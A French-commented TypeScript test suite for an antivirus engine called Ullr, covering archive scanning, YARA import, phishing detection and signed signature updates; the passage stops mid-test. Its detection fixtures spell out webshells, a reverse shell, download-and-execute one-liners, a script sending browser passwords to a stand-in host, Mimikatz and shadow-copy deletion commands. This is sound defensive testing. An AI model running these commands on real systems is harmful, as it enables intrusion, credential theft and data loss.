// Ullr, l'antivirus d'Odin. Tous les échantillons d'ici sont INOFFENSIFS : le fichier de test standard
// des antivirus (EICAR), et des textes qui ressemblent à des attaques sans rien pouvoir faire.
// Aucun vrai malware n'est téléchargé ni créé.
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { crc32, deflateRawSync, gzipSync } from 'node:zlib';
import { wireReflexes } from '../src/valhalla/links.ts';
import { nextRun, ullr, ullrKeys, walk, excepted, vital } from '../src/valhalla/modules/ullr.ts';
import { allModules } from '../src/valhalla/odin.ts';
import { Valhalla } from '../src/valhalla/service.ts';
import { BASE_RULES, combine, compileGaldr, entropy, fileType, flat, hay, importYara, reAtom, isPassive, phishing, regDomain, RuleSet, scanBuffer, sureOf, unzip, urlRisk, type Knowledge } from '../src/valhalla/ullr/engine.ts';
import { Correlator, SENSORS, score, toSignal } from '../src/valhalla/ullr/incidents.ts';
import { csvLine, Intel, normIoc, parseClamHsb, parseDomains, parseKev, parseMbCsv, parseStalkerware, parseThreatFox, parseUrls, reputationText, SOURCES } from '../src/valhalla/ullr/intel.ts';

const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
const WEBSHELL = '<?php eval(base64_decode($_POST["c"])); ?>';
const sha = (b: Buffer | string) => createHash('sha256').update(b).digest('hex');
const K: Knowledge = { rules: new RuleSet(BASE_RULES.map(compileGaldr)) };
const scan = (name: string, content: Buffer | string, where = '/home/awa/Téléchargements') => scanBuffer(name, Buffer.from(content as string), K, { where });
const threats = (v: ReturnType<typeof scan>) => flat(v).map((f) => f.threat);
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
async function until(fn: () => unknown, ms = 8000): Promise<boolean> { const end = Date.now() + ms; for (;;) { if (await fn()) return true; if (Date.now() > end) return false; await wait(40); } }

/** Petit fabricant de zip (pour les tests) : fichiers stockés ou compressés, éventuellement « chiffrés ». */
function zip(files: Array<{ name: string; data: Buffer; store?: boolean; encrypted?: boolean }>): Buffer {
  const locals: Buffer[] = [], central: Buffer[] = []; let off = 0;
  for (const f of files) {
    const name = Buffer.from(f.name), raw = f.store ? f.data : deflateRawSync(f.data), crc = crc32(f.data), flags = f.encrypted ? 1 : 0, method = f.store ? 0 : 8;
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(flags, 6); lh.writeUInt16LE(method, 8); lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(raw.length, 18); lh.writeUInt32LE(f.data.length, 22); lh.writeUInt16LE(name.length, 26);
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(flags, 8); ch.writeUInt16LE(method, 10); ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(raw.length, 20); ch.writeUInt32LE(f.data.length, 24); ch.writeUInt16LE(name.length, 28); ch.writeUInt32LE(off, 42);
    locals.push(lh, name, raw); central.push(ch, name); off += 30 + name.length + raw.length;
  }
  const cd = Buffer.concat(central), end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(files.length, 8); end.writeUInt16LE(files.length, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, cd, end]);
}
function tar(files: Array<{ name: string; data: Buffer }>): Buffer {
  const out: Buffer[] = [];
  for (const f of files) { const h = Buffer.alloc(512); h.write(f.name, 0, 'latin1'); h.write(f.data.length.toString(8).padStart(11, '0'), 124, 'latin1'); h.write('0', 156, 'latin1'); h.write('ustar', 257, 'latin1'); out.push(h, f.data, Buffer.alloc((512 - (f.data.length % 512)) % 512)); }
  return Buffer.concat([...out, Buffer.alloc(1024)]);
}

// ---------------------------------------------------------------- Le moteur
test('Ullr · vrai type d\'un fichier : le contenu, pas le nom', () => {
  assert.equal(fileType(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(100)]), 'photo.jpg'), 'pe');
  assert.equal(fileType(Buffer.from('7f454c4602010100', 'hex'), 'rapport.pdf'), 'elf');
  assert.equal(fileType(Buffer.from('%PDF-1.7\n'), 'x'), 'pdf');
  assert.equal(fileType(zip([{ name: 'a.txt', data: Buffer.from('a') }]), 'x.docx'), 'word');
  assert.equal(fileType(zip([{ name: 'a.txt', data: Buffer.from('a') }]), 'x.apk'), 'apk');
  assert.equal(fileType(gzipSync(Buffer.from('a')), 'x'), 'gzip');
  assert.equal(fileType(Buffer.from('#!/usr/bin/env python3\nprint(1)'), 'outil'), 'python');
  assert.equal(fileType(Buffer.from('#!/bin/sh\necho 1'), 'outil'), 'shell');
  assert.equal(fileType(Buffer.from('<?php echo 1;'), 'x'), 'php');
  assert.equal(fileType(Buffer.from('const a = 1;'), 'app.js'), 'javascript');
  assert.equal(fileType(Buffer.from('var s = new ActiveXObject("WScript.Shell");'), 'facture.js'), 'script windows', 'un .js qui pilote Windows n\'est pas du code de site web');
  assert.equal(fileType(Buffer.from('Bonjour'), 'note.txt'), 'texte');
  assert.ok(isPassive('doc.md', 'texte') && isPassive('code.ts', 'texte') && !isPassive('run.sh', 'shell') && !isPassive('sans-extension', 'texte'));
  assert.ok(entropy(Buffer.from('aaaaaaaaaaaaaaaa')) < 0.1 && entropy(Buffer.from(Array.from({ length: 4096 }, (_x, i) => (i * 7919) % 256))) > 7.5);
});

test('Ullr · le fichier de test EICAR est reconnu partout : seul, compressé, dans une archive, dans une archive dans une archive', () => {
  for (const [name, content] of [
    ['eicar.com', Buffer.from(EICAR)], ['eicar.txt', Buffer.from(EICAR)], ['eicar.com.gz', gzipSync(Buffer.from(EICAR))],
    ['archive.zip', zip([{ name: 'lisezmoi.txt', data: Buffer.from('rien') }, { name: 'dossier/eicar.com', data: Buffer.from(EICAR) }])],
    ['archive-stockee.zip', zip([{ name: 'eicar.com', data: Buffer.from(EICAR), store: true }])],
    ['double.zip', zip([{ name: 'interieur.zip', data: zip([{ name: 'eicar.com', data: Buffer.from(EICAR) }]) }])],
    ['sauvegarde.tar', tar([{ name: 'a/eicar.com', data: Buffer.from(EICAR) }])],
    ['sauvegarde.tar.gz', gzipSync(tar([{ name: 'eicar.com', data: Buffer.from(EICAR) }]))],
  ] as Array<[string, Buffer]>) {
    const v = scan(name, content);
    assert.ok(threats(v).includes('Test antivirus EICAR'), `${name} : EICAR trouvé`);
    assert.ok(v.level, `${name} : une alerte est levée`);
    assert.equal(sureOf(v), false, `${name} : un fichier de test n'est jamais mis en quarantaine tout seul`);
  }
  const inner = flat(scan('double.zip', zip([{ name: 'interieur.zip', data: zip([{ name: 'eicar.com', data: Buffer.from(EICAR) }]) }]))).find((f) => f.klass === 'test');
  assert.equal(inner?.file, 'double.zip!interieur.zip!eicar.com', 'le chemin à l\'intérieur des archives est donné');
});

test('Ullr · archives : bombe de décompression repérée sans saturer, archive à mot de passe signalée, limites tenues', () => {
  const bomb = zip([{ name: 'gros.bin', data: Buffer.alloc(24 * 1024 * 1024) }]);
  assert.ok(bomb.length < 100_000, 'la bombe pèse quelques Ko');
  const z = unzip(bomb, { maxEach: 4 * 1024 * 1024 });
  assert.equal(z.bomb, true); assert.equal(z.entries[0].data, undefined, 'le contenu n\'est pas déplié en mémoire');
  assert.ok(threats(scan('cadeau.zip', bomb)).includes('Bombe de décompression'));
  const locked = scan('facture.zip', zip([{ name: 'facture.exe', data: Buffer.from('xx'), encrypted: true }]));
  assert.ok(threats(locked).includes('Archive à mot de passe contenant un programme'));
  assert.equal(unzip(Buffer.from('pas un zip')).entries.length, 0);
  assert.equal(unzip(zip(Array.from({ length: 30 }, (_x, i) => ({ name: `f${i}`, data: Buffer.from('a') }))), { maxEntries: 10 }).truncated, true);
});

test('Ullr · chaque classe de menace est reconnue, avec sa raison et sa technique d\'attaque', () => {
  const cases: Array<[string, Buffer | string, string, boolean]> = [
    ['shell.php', WEBSHELL, 'PHP.Webshell (eval encodé)', true],
    ['cmd.php', '<?php system($_GET["c"]); ?>', 'PHP.Webshell (commande depuis la requête)', true],
    ['rev.sh', '#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n', 'Shell inversé', true],
    ['mine.sh', 'xmrig -o stratum+tcp://pool.exemple.fr:3333 -u 4AbC -p x', 'Mineur de cryptomonnaie (adresse de pool)', true],
    ['config.json', '{"pools":[{"url":"pool.exemple.fr:3333"}],"donate-level": 1, "algo": "rx/0"}', 'Mineur de cryptomonnaie (configuration)', false],
    ['facture.js', 'var s=new ActiveXObject("WScript.Shell");var x=new ActiveXObject("MSXML2.XMLHTTP");s.Run("cmd /c calc");', 'JavaScript Windows malveillant', true],
    ['maj.ps1', `powershell -nop -w hidden -enc ${'A'.repeat(80)}`, 'PowerShell encodé', true],
    ['outil.ps1', 'Invoke-Mimikatz\nsekurlsa::logonpasswords\nprivilege::debug', 'Vol d\'identifiants (Mimikatz)', true],
    ['nettoyage.bat', 'vssadmin delete shadows /all /quiet\r\n', 'Effacement des sauvegardes Windows', true],
    ['LISEZ-MOI.txt', 'Vos fichiers ont été chiffrés. Pour les déchiffrer, payez 0.5 bitcoin : abcdefghijklmnop2345.onion', 'Demande de rançon', false],
    ['README.txt', 'All your files have been encrypted. Decryption costs 1 BTC.', 'Demande de rançon', false],
    ['prep.sh', '#!/bin/sh\nsystemctl stop ufw\nsetenforce 0\n', 'Désactivation des protections', true],
    ['touches.py', 'from pynput.keyboard import Listener\nimport smtplib\ndef on(k): smtplib.SMTP("x").sendmail("a","b",str(k))\n', 'Enregistreur de frappes', true],
    ['a.ps1', 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a.ps1")', 'Télécharge et exécute en une seule commande', false],
    ['b.sh', '#!/bin/sh\nwget http://203.0.113.5/x -O /tmp/.x\nchmod +x /tmp/.x\n/tmp/.x &\n', 'Télécharge un programme dans un dossier temporaire et le lance', false],
    ['c.py', 'import base64\nexec(base64.b64decode("aW1wb3J0IG9z"))\n', 'Code caché en base64 puis exécuté', false],
    ['d.py', 'import os,requests\nd=open(os.path.expanduser("~/.config/google-chrome/Default/Login Data"),"rb").read()\nrequests.post("http://203.0.113.5/u",data=d)\n', 'Lit les mots de passe du navigateur et les envoie ailleurs', false],
    ['facture.pdf.exe', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200)]), 'Double extension trompeuse', false],
    ['rapport.pdf', Buffer.concat([Buffer.from('MZ'), Buffer.alloc(300)]), 'Programme déguisé en document', true],
    ['devis.pdf', '%PDF-1.4\n1 0 obj << /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n3 0 obj << /S /Launch /F (cmd.exe) >> endobj', 'PDF qui lance un programme', false],
    ['photo.lnk', Buffer.concat([Buffer.from('4c0000000114020000000000c000000000000046', 'hex'), Buffer.from('p\0o\0w\0e\0r\0s\0h\0e\0l\0l\0 \0-\0w\0 \0h\0i\0d\0d\0e\0n\0 \0h\0t\0t\0p\0:\0/\0/\0x\0', 'latin1')]), 'Raccourci qui lance une commande', false],
    ['connexion.html', '<html><title>PayPal - Connexion</title><form action="http://203.0.113.5/p.php"><input type="password" name="p"></form></html>', 'Formulaire qui envoie le mot de passe ailleurs', false],
  ];
  for (const [name, content, threat, sure] of cases) {
    const v = scan(name, content), f = flat(v).find((x) => x.threat === threat);
    assert.ok(f, `${name} : « ${threat} » attendu, trouvé : ${threats(v).join(' | ') || 'rien'}`);
    assert.ok(v.level, `${name} : alerte levée (score ${v.score})`);
    assert.ok(f.why.length > 15, `${name} : la raison est expliquée`);
    assert.equal(sureOf(v), sure, `${name} : ${sure ? 'assez sûr pour la quarantaine' : 'simple soupçon, à vérifier'}`);
  }
  assert.equal(flat(scan('rev.sh', '#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n'))[0].attack, 'T1059', 'la technique MITRE ATT&CK accompagne la détection');
  // Document Office avec macro lancée à l'ouverture (un .docm est un zip).
  const docm = scan('contrat.docm', zip([{ name: 'word/vbaProject.bin', data: Buffer.from('Sub AutoOpen()\nCreateObject("WScript.Shell").Run "powershell"\nEnd Sub', 'latin1'), store: true }]));
  assert.ok(threats(docm).includes('Document avec macros') && threats(docm).includes('Macro qui lance des commandes'), threats(docm).join(' | '));
});

test('Ullr · pas de fausse alerte : fichiers ordinaires, documentation de sécurité, installateurs honnêtes, bibliothèques', () => {
  const clean: Array<[string, string, string?]> = [
    ['note.txt', 'Bonjour, voici le compte rendu de la réunion de mardi.'],
    ['cours-securite.md', `Un shell inversé ressemble à : \`bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\`. Un webshell : \`${WEBSHELL}\`. Outil : sekurlsa::logonpasswords, privilege::debug, vssadmin delete shadows.`],
    ['regles.yar', 'rule X { strings: $a = "sekurlsa::logonpasswords" $b = "privilege::debug" condition: all of them }'],
    ['moteur.ts', `const REGLES = ['stratum+tcp://pool.exemple.fr:3333', 'bash -i >& /dev/tcp/', '${WEBSHELL}'];`],
    ['install.sh', '#!/bin/sh\n# Usage : curl -fsSL https://exemple.fr/install.sh | bash\nset -e\nmkdir -p /opt/app\nsystemctl enable monservice\n', '/home/awa/projets/app'],
    ['install.ps1', '# irm https://exemple.fr/install.ps1 | iex\nWrite-Host "Installation"\n', '/home/awa/projets/app'],
    ['lib.min.js', `const police = atob("${'QUJD'.repeat(400)}"); const m = /a(b)/.exec(texte); function f(){ return eval; }`],
    ['sauvegarde.sh', '#!/bin/sh\ntar czf /tmp/sauvegarde.tgz /home/awa/documents\ncurl -T /tmp/sauvegarde.tgz https://stockage.exemple.fr/\n', '/home/awa/scripts'],
    ['page.html', '<html><title>Mon site</title><a href="https://www.google-analytics.com/analytics.js">stats</a><a href="https://tug.org/x/LICENSE.TL">LICENSE.TL</a><a href="https://tug.org/interest.html">interest.html</a></html>'],
    ['connexion.html', '<html><title>Odin</title><form action="/api/account/login"><input type="password"></form></html>'],
  ];
  for (const [name, content, where] of clean) { const v = scan(name, content, where ?? '/home/awa/projets/app'); assert.equal(v.level, undefined, `${name} : aucune alerte attendue, mais ${v.score}/100 (${threats(v).join(' | ')})`); }
  // Le même installateur, arrivé dans les téléchargements, mérite un coup d'œil (et dit pourquoi) — sans quarantaine.
  const arrived = scan('install.sh', '#!/bin/sh\ncurl -s http://203.0.113.5/i.sh | bash\ncrontab -l | { cat; echo "* * * * * curl -s http://203.0.113.5/i.sh | sh"; } | crontab -\n');
  assert.equal(arrived.level, 'moyenne'); assert.equal(sureOf(arrived), false);
  // Une documentation qui cite une attaque : l'indice est noté, expliqué, mais ne déclenche rien.
  const doc = scan('cours.md', 'Exemple : `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1`');
  assert.equal(doc.level, undefined); assert.match(flat(doc)[0].why, /documentation, un test ou une règle/);
});

test('Ullr · score explicable : les indices se cumulent sans dépasser 100, et chaque seuil a un sens', () => {
  assert.deepEqual(combine([]), { score: 0, level: undefined });
  assert.equal(combine([{ score: 30 } as never]).level, undefined, 'un seul indice faible : pas d\'alerte');
  assert.equal(combine([{ score: 30 } as never, { score: 30 } as never]).level, 'moyenne', 'deux indices faibles : à vérifier');
  assert.equal(combine([{ score: 45 } as never, { score: 45 } as never]).level, 'haute');
  assert.equal(combine([{ score: 95 } as never]).level, 'critique');
  assert.equal(combine([{ score: 100 } as never, { score: 100 } as never]).score, 100);
});

test('Ullr · règles Galdr (maison) : chaînes, expressions, « il faut N », filtre de fichiers, accents', () => {
  const set = new RuleSet([
    { name: 'Deux sur trois', level: 'haute' as const, strings: ['alpha', '/b[eé]ta/i', 'gamma'], need: 2 },
    { name: 'Tous', level: 'critique' as const, strings: ['un', 'deux'], need: 'tous' as const },
    { name: 'Seulement PHP', level: 'haute' as const, strings: ['marqueur'], need: 'un' as const, files: '\\.php$' },
    { name: 'Accent', level: 'haute' as const, strings: ['/donn(é|e)es volées/', 'clé privée'], need: 'un' as const },
  ].map(compileGaldr));
  const hit = (name: string, text: string | Buffer) => scanBuffer(name, Buffer.from(text as string), { rules: set }).findings.map((f) => f.threat);
  assert.deepEqual(hit('a.sh', 'alpha et gamma'), ['Deux sur trois']);
  assert.deepEqual(hit('a.sh', 'alpha seul'), []);
  assert.deepEqual(hit('a.sh', 'un puis deux'), ['Tous']);
  assert.deepEqual(hit('a.sh', 'marqueur'), []); assert.deepEqual(hit('a.php', 'marqueur'), ['Seulement PHP']);
  assert.deepEqual(hit('a.sh', 'données volées'), ['Accent'], 'texte en UTF-8');
  assert.deepEqual(hit('a.sh', Buffer.from('donn\xe9es vol\xe9es', 'latin1')), ['Accent'], 'texte en Latin-1 (Windows)');
  assert.deepEqual(hit('a.sh', 'la clé privée'), ['Accent']);
  assert.throws(() => compileGaldr({ name: 'cassée', level: 'haute', strings: ['/(/'], need: 'un' }), 'une expression invalide est refusée à l\'ajout');
});

test('Ullr · règles YARA importées : sous-ensemble compris, le reste écarté et compté', () => {
  const src = `
/* commentaire */
rule Test_Webshell_Generic : webshell {
  meta:
    description = "Webshell PHP de test"
    score = 80
  strings:
    $a = "eval(gzinflate(" nocase
    $b = { 3C 3F 70 68 70 }   // <?php
    $c = /passthru\\s*\\(/
  condition:
    $b and any of ($a, $c) and filesize < 100KB
}
rule Test_Wide_Fullword {
  strings:
    $w = "SecretTool" wide ascii fullword
  condition:
    all of them
}
rule Test_Pe_Header_Jokers {
  strings:
    $h = { 4D 5A ?? ?? [2-4] (AA | BB) }
    $x = "deux" $y = "trois"
  condition:
    uint16(0) == 0x5A4D and $h
}
rule Test_Deux_Sur {
  strings:
    $s1 = "premier"
    $s2 = "second"
    $s3 = "troisieme"
  condition:
    2 of ($s*) and not $s3
}
rule Utilise_Le_Module_PE {
  strings:
    $a = "x"
  condition:
    pe.number_of_sections > 3 and $a
}
rule Utilise_Une_Boucle {
  strings:
    $a = "x"
  condition:
    for any i in (1..#a) : (@a[i] < 100)
}
private rule Privee { strings: $a = "x" condition: $a }
`;
  const y = importYara(src, 'essai');
  assert.equal(y.total, 6, 'six règles publiques lues (la règle privée ne compte pas comme règle utilisable)');
  assert.deepEqual(y.rules.map((r) => r.name).sort(), ['Test_Deux_Sur', 'Test_Pe_Header_Jokers', 'Test_Webshell_Generic', 'Test_Wide_Fullword']);
  assert.equal(y.skipped, 2, 'les règles qui emploient un module ou une boucle sont écartées, pas mal interprétées');
  const set = new RuleSet(y.rules), hit = (name: string, b: Buffer | string) => set.match(hay(Buffer.from(b as string), name)).map((r) => r.name);
  assert.deepEqual(hit('x.php', '<?php EVAL(GZINFLATE(base64_decode("x")));'), ['Test_Webshell_Generic'], 'nocase + octets + condition');
  assert.deepEqual(hit('x.php', '<?php passthru ($x);'), ['Test_Webshell_Generic']);
  assert.deepEqual(hit('x.php', 'eval(gzinflate( sans en-tête php'), []);
  assert.deepEqual(hit('x.bin', Buffer.from('S\0e\0c\0r\0e\0t\0T\0o\0o\0l\0', 'latin1')), ['Test_Wide_Fullword'], 'chaîne « wide » (UTF-16)');
  assert.deepEqual(hit('x.bin', 'MySecretToolBox'), [], '« fullword » : pas au milieu d\'un mot');
  assert.deepEqual(hit('x.exe', Buffer.from('4d5a9000030000aa', 'hex')), ['Test_Pe_Header_Jokers'], 'jokers, sauts et alternatives hexadécimales');
  assert.deepEqual(hit('x.exe', Buffer.from('4d5a9000030000cc', 'hex')), []);
  assert.deepEqual(hit('x.txt', 'premier et second'), ['Test_Deux_Sur']);
  assert.deepEqual(hit('x.txt', 'premier, second, troisieme'), []);
  assert.equal(y.rules.find((r) => r.name === 'Test_Webshell_Generic')!.klass, 'webshell', 'la classe est déduite du nom et de la description');
});

test('Ullr · adresses web : imitation de marque, lettres remplacées, vrais sites jamais signalés', () => {
  const risk = (u: string) => combine(urlRisk(u));
  for (const good of ['https://www.paypal.com/signin', 'https://storage.googleapis.com/x', 'https://free-download.com', 'https://pineapple.com', 'https://impots.gouv.fr/', 'https://login.microsoftonline.com/x', 'https://toufatech.com', 'https://oqgbarber.com/reserver', 'https://orange.es', 'https://mon-cafe.exemple.com', 'https://www.credit-agricole.fr/'])
    assert.equal(risk(good).score, 0, `${good} : rien à signaler (${urlRisk(good).map((f) => f.threat).join(' | ')})`);
  for (const [bad, threat] of [['http://paypal.com.secure-login.xyz/', 'Imite une marque connue'], ['https://paypal-secure.com', 'Imite une marque connue'], ['http://paypa1.com/x', 'Imite une marque en changeant des lettres'], ['https://netfl1x-compte.com', 'Imite une marque en changeant des lettres'], ['https://arnazon.fr', 'Imite une marque en changeant des lettres'], ['https://impots-gouv.fr.remboursement.top', 'Imite une marque connue'], ['https://free-compte-client.com', 'Imite une marque connue'], ['http://203.0.113.9/a.exe', 'Lien direct vers un programme'], ['http://paypal.com@203.0.113.9/', 'Adresse trompeuse avec « @ »']] as Array<[string, string]>) {
    assert.ok(urlRisk(bad).some((f) => f.threat === threat), `${bad} : « ${threat} » attendu, trouvé ${urlRisk(bad).map((f) => f.threat).join(' | ')}`);
    assert.ok(risk(bad).level, `${bad} : alerte (score ${risk(bad).score})`);
  }
  assert.equal(regDomain('paypal.com.secure-login.xyz'), 'secure-login.xyz'); assert.equal(regDomain('www.impots.gouv.fr'), 'impots.gouv.fr'); assert.equal(regDomain('a.b.exemple.co.uk'), 'exemple.co.uk');
});

test('Ullr · hameçonnage dans un message ou une page : pression, lien menteur, expéditeur, pièce jointe', () => {
  const mail = 'From: "Service client" <service@banque-exemple.fr>\nReply-To: <recup@autre-domaine.xyz>\nSubject: Urgent\nAuthentication-Results: mx; spf=fail\nContent-Disposition: attachment; filename="facture.html"\n\nVotre compte sera suspendu sous 24 h. <a href="http://203.0.113.9/login">https://www.labanquepostale.fr/connexion</a>';
  const f = phishing(mail, 'eml'), names = f.map((x) => x.threat);
  for (const t of ['Message qui met la pression', 'Lien qui ment sur sa destination', 'La réponse part vers une autre adresse', 'Expéditeur non authentifié', 'Pièce jointe à risque']) assert.ok(names.includes(t), `« ${t} » attendu, trouvé ${names.join(' | ')}`);
  assert.equal(combine(f).level, 'critique');
  assert.deepEqual(phishing('Bonjour Awa, on se voit jeudi à 10 h au salon ? Le devis est sur https://toufatech.com/devis. Bonne journée.', 'texte'), []);
  assert.deepEqual(phishing('From: Awa <awa@toufatech.com>\nSubject: Devis\n\nBonjour, voici le lien : <a href="https://toufatech.com/devis">https://toufatech.com/devis</a>', 'eml'), []);
});

// ---------------------------------------------------------------- La base de connaissances (paquets signés)
test('Ullr · base de signatures : paquet signé, testé avant activation, altération refusée, retour arrière', () => {
  const dir = mkdtempSync(join(tmpdir(), 'odin-ullr-intel-'));
  try {
    const intel = new Intel(dir); assert.equal(intel.load().version, 0); assert.equal(intel.hashCount(), 0);
    const a = sha('échantillon A'), b = sha('échantillon B');
    const m1 = intel.build([{ hashes: [{ sha: a, family: 'AgentTesla' }, { sha: 'pas-une-empreinte' }], iocs: [{ kind: 'domaine', value: 'http://Mechant.exemple.fr/chemin' }, { kind: 'hameçonnage', value: 'faux-site.exemple.net' }, { kind: 'espion', value: 'espion.exemple.org' }, { kind: 'url', value: 'http://203.0.113.9/a.exe' }], stamp: { id: 'essai', at: '2026-11-11T10:00:00Z', count: 2, licence: 'test' } }]);
    assert.equal(m1.version, 1); assert.equal(m1.hashes, 1, 'les empreintes mal formées sont ignorées'); assert.equal(m1.iocs, 4);
    assert.deepEqual(intel.hash(a), { family: 'AgentTesla', source: 'essai' }); assert.equal(intel.hash(b), undefined); assert.equal(intel.hash(a.toUpperCase())?.family, 'AgentTesla');
    assert.equal(intel.site('https://sous.mechant.exemple.fr/x')?.what, 'malware', 'un sous-domaine d\'un site connu est reconnu');
    assert.equal(intel.site('http://faux-site.exemple.net/login')?.what, 'hameçonnage'); assert.equal(intel.site('espion.exemple.org')?.what, 'logiciel espion');
    assert.equal(intel.site('http://203.0.113.9/a.exe')?.what, 'malware'); assert.equal(intel.site('https://toufatech.com'), undefined);
    assert.equal(normIoc('domaine', 'HTTPS://WWW.Exemple.FR:8443/a?b'), 'exemple.fr');
    assert.equal(intel.check(1), undefined, 'signature et empreintes des fichiers valides');
    // Version 2 : s'ajoute à la 1 ; refusée si le test échoue.
    assert.throws(() => intel.build([{ hashes: [{ sha: b }], stamp: { id: 'essai', at: 'x', count: 1, licence: 't' } }], () => 'un fichier sain serait signalé'), /mise à jour refusée : un fichier sain serait signalé\. La version 1 reste en service/);
    assert.equal(intel.current(), 1); assert.equal(intel.hash(b), undefined, 'rien de la version refusée n\'est en service');
    const m2 = intel.build([{ hashes: [{ sha: b, family: 'Lumma' }], yara: { 'essai.regles': 'rule R1 {\n  strings:\n    $a = "marqueur-de-test"\n  condition:\n    $a\n}\n' }, kev: [{ cve: 'CVE-2026-0001', vendor: 'Exemple', product: 'Serveur', name: 'Faille', added: '2026-11-01', ransomware: false }], stamp: { id: 'autre', at: 'x', count: 1, licence: 't' } }], (cand) => (cand.hash(b) && cand.hash(a) ? undefined : 'la candidate devrait contenir A et B'));
    assert.equal(m2.version, 2); assert.equal(m2.hashes, 2); assert.equal(intel.hash(b)?.source, 'autre'); assert.equal(intel.hash(a)?.family, 'AgentTesla', 'les versions s\'additionnent');
    assert.equal(intel.yara().length, 1); assert.deepEqual(m2.rules['essai.regles'], { imported: 1, skipped: 0 }); assert.equal(intel.kev()[0].cve, 'CVE-2026-0001');
    // Altération d'un fichier de la version en service : refusée au chargement, retour à la version saine.
    const f = join(dir, 'signatures', 'v2', 'empreintes.bin'); const raw = readFileSync(f); raw[0] ^= 0xff; writeFileSync(f, raw);
    assert.match(intel.check(2) ?? '', /empreintes\.bin.*modifié/);
    const again = new Intel(dir), l = again.load();
    assert.equal(l.version, 1, 'retour automatique à la dernière version saine'); assert.equal(l.refused[0].version, 2); assert.equal(again.hash(b), undefined); assert.ok(again.hash(a));
    // Manifeste modifié : la signature ne correspond plus.
    const mf = join(dir, 'signatures', 'v1', 'manifeste.json'); writeFileSync(mf, readFileSync(mf, 'utf8').replace('"hashes": 1', '"hashes": 9'));
    assert.match(again.check(1) ?? '', /signature invalide/);
    assert.equal(new Intel(dir).load().version, 0, 'plus aucune version saine : seules les règles de base restent');
    // Retour arrière voulu, et pas plus de trois versions gardées.
    const d2 = mkdtempSync(join(tmpdir(), 'odin-ullr-intel-'));
    try {
      const i2 = new Intel(d2); i2.load();
      for (let n = 1; n <= 5; n++) i2.build([{ hashes: [{ sha: sha(`v${n}`) }], stamp: { id: 's', at: 'x', count: 1, licence: 't' } }]);
      assert.deepEqual(i2.versions().map((m) => m.version), [5, 4, 3]); assert.equal(i2.hashCount(), 5);
      assert.equal(i2.rollback().version, 4); assert.equal(i2.current(), 4); assert.equal(i2.hash(sha('v5')), undefined); assert.ok(i2.hash(sha('v4')));
      assert.equal(readdirSync(join(d2, 'signatures')).filter((x) => x.endsWith('.tmp')).length, 0, 'aucun reste de préparation');
    } finally { rmSync(d2, { recursive: true, force: true }); }
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('Ullr · formats des sources : MalwareBazaar, ThreatFox, URLhaus/OpenPhish, listes de sites, Stalkerware, CISA KEV, ClamAV', () => {
  const h = 'a'.repeat(64), h2 = 'b'.repeat(64);
  assert.deepEqual(csvLine('"a, b", "c ""d""", e'), ['a, b', 'c "d"', 'e']);
  const mb = `################\n# MalwareBazaar recent malware samples #\n# "first_seen_utc","sha256_hash","md5_hash","sha1_hash","reporter","file_name","file_type_guess","mime_type","signature","clamav","vtpercent","imphash","ssdeep","tlsh"\n"2026-11-10 10:00:00", "${h}", "${'c'.repeat(32)}", "${'d'.repeat(40)}", "abuse_ch", "invoice, final.exe", "exe", "application/x-dosexec", "AgentTesla", "n/a", "45.2", "x", "y", "z"\n"2026-11-10 10:01:00", "${h2}", "${'c'.repeat(32)}", "${'d'.repeat(40)}", "x", "a.dll", "dll", "application/x-dosexec", "n/a", "n/a", "n/a", "", "", ""\n`;
  assert.deepEqual(parseMbCsv(mb), [{ sha: h, family: 'AgentTesla' }, { sha: h2, family: undefined }]);
  const tf = parseThreatFox(JSON.stringify({ query_status: 'ok', data: [{ ioc: '203.0.113.9:4444', ioc_type: 'ip:port', malware_printable: 'Cobalt Strike', confidence_level: 100 }, { ioc: 'c2.exemple.fr', ioc_type: 'domain', confidence_level: 75 }, { ioc: h, ioc_type: 'sha256_hash', malware_printable: 'Lumma', confidence_level: 90 }, { ioc: 'peu-sur.exemple.fr', ioc_type: 'domain', confidence_level: 25 }] }));
  assert.deepEqual(tf.hashes, [{ sha: h, family: 'Lumma' }]); assert.deepEqual(tf.iocs.map((x) => x.value), ['203.0.113.9:4444', 'c2.exemple.fr'], 'les indicateurs peu sûrs ne sont pas repris');
  assert.deepEqual(parseUrls('# en-tête\nhttp://203.0.113.9/a.exe\n\nhttps://x.exemple.fr/p\nftp://non\n').map((x) => x.value), ['http://203.0.113.9/a.exe', 'https://x.exemple.fr/p']);
  assert.deepEqual(parseDomains('0.0.0.0 faux.exemple.fr\nautre.exemple.net\n# commentaire\npas un domaine\n', 'hameçonnage').map((x) => x.value), ['faux.exemple.fr', 'autre.exemple.net']);
  const sw = parseStalkerware('- name: EspionX\n  type: stalkerware\n  packages:\n  - com.exemple.espionx\n  websites:\n  - espionx.exemple.com\n  c2:\n    ips:\n    - 203.0.113.77\n    domains:\n    - c2.espionx.exemple.com\n- name: Autre\n  packages:\n  - org.autre.suivi\n');
